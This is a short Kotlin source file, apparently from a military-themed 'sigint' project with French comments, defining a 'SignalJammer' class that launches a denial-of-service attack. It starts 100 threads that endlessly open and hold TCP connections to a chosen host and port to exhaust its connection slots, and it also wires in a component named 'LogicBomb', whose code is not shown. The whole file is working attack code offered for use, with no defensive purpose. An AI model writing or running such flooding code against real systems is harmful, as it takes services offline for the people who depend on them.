package com.fardc.sigint.core

import java.net.InetSocketAddress
import java.net.Socket
import com.fardc.sigint.security.LogicBomb

/**
 * SIGNAL-JAMMER v8.1 (Purified)
 * Standard: Network Denial of Service (DoS)
 * Rôle: Saturation de la pile TCP ennemie
 */
class SignalJammer(private val logger: BlackBox) {
    private var isActive = false
    private val securityTrigger = LogicBomb(logger)

    fun executeJamming(target: String, port: Int) {
        isActive = true
        logger.recordIncident("JAM_START", "Saturation lancée sur $target:$port")

        // Utilisation de threads isolés pour éviter de bloquer le noyau
        repeat(100) { // Augmentation de la puissance de feu (100 vecteurs)
            Thread {
                while (isActive) {
                    try {
                        val socket = Socket()
                        // Timeout court pour une rotation rapide (Standard Militaire)
                        socket.connect(InetSocketAddress(target, port), 500)
                        
                        // Maintien de la connexion pour bloquer un slot sur la cible
                        Thread.sleep(2000) 
                        socket.close()
                    } catch (e: Exception) {
                        // Ici, l'échec est bon signe : la cible refuse car elle est pleine
                    }
                }
            }.start()
        }
    }

    fun emergencyStop() {
        isActive = false
        logger.recordIncident("JAM_STOP", "Cessez-le-feu immédiat.")
    }
}
